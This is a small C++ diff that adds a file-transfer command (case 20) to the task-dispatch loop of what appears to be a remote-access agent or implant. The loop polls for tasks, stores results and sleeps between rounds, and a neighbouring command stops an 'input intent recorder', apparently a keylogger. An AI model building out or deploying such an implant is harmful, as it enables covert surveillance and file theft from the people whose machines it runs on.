@@ -146,6 +146,11 @@ int main(int argc, char *argv[])
                 std::string result = agent.StopInputIntentRecorder();
                 taskManager.StoreTaskResult(task.id, true, result);
                 break;
+
+            case 20:
+                std::string result = agent.FileTransfer();
+                taskManager.StoreTaskResult(task.id, true, result);
+                break;
             }
         }
         Sleep(5000);
